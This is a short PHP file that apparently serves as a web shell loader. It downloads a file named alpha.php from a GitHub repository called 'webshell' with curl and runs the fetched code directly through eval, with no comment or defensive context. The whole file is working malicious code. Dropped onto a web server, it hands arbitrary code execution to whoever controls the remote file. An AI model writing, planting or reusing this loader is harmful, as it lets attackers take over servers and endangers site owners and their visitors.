<?php 
$link = 'https://raw.githubusercontent.com/dorzkim/webshell/refs/heads/main/alpha.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>